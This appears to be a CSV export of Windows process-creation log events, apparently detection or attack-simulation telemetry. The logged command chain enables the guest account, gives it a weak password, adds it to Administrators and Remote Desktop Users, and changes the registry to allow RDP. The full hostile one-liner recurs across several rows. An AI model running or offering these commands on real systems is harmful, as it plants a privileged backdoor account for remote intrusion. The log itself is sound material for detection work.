process,winlog,@timestamp,file
"{'parent': {'name': 'powershell.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" '}, 'name': 'cmd.exe', 'command_line': '""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f'}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.190Z,
"{'parent': {'name': 'cmd.exe', 'command_line': '""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f'}, 'name': 'net.exe', 'command_line': 'net  user guest /active:yes '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.290Z,
"{'parent': {'name': 'net.exe', 'command_line': 'net  user guest /active:yes '}, 'name': 'net1.exe', 'command_line': 'C:\\Windows\\system32\\net1  user guest /active:yes '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.313Z,
"{'parent': {'name': 'cmd.exe', 'command_line': '""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f'}, 'name': 'net.exe', 'command_line': 'net  user guest Password123! '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.392Z,
"{'parent': {'name': 'net.exe', 'command_line': 'net  user guest Password123! '}, 'name': 'net1.exe', 'command_line': 'C:\\Windows\\system32\\net1  user guest Password123! '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.454Z,
"{'parent': {'name': 'cmd.exe', 'command_line': '""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f'}, 'name': 'net.exe', 'command_line': 'net  localgroup Administrators guest /add '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.539Z,
"{'parent': {'name': 'net.exe', 'command_line': 'net  localgroup Administrators guest /add '}, 'name': 'net1.exe', 'command_line': 'C:\\Windows\\system32\\net1  localgroup Administrators guest /add '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.562Z,
"{'parent': {'name': 'cmd.exe', 'command_line': '""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f'}, 'name': 'net.exe', 'command_line': 'net  localgroup ""Remote Desktop Users"" guest /add '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.623Z,
"{'parent': {'name': 'net.exe', 'command_line': 'net  localgroup ""Remote Desktop Users"" guest /add '}, 'name': 'net1.exe', 'command_line': 'C:\\Windows\\system32\\net1  localgroup ""Remote Desktop Users"" guest /add '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.646Z,
"{'parent': {'name': 'cmd.exe', 'command_line': '""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f'}, 'name': 'reg.exe', 'command_line': 'reg  add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f '}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:22.703Z,
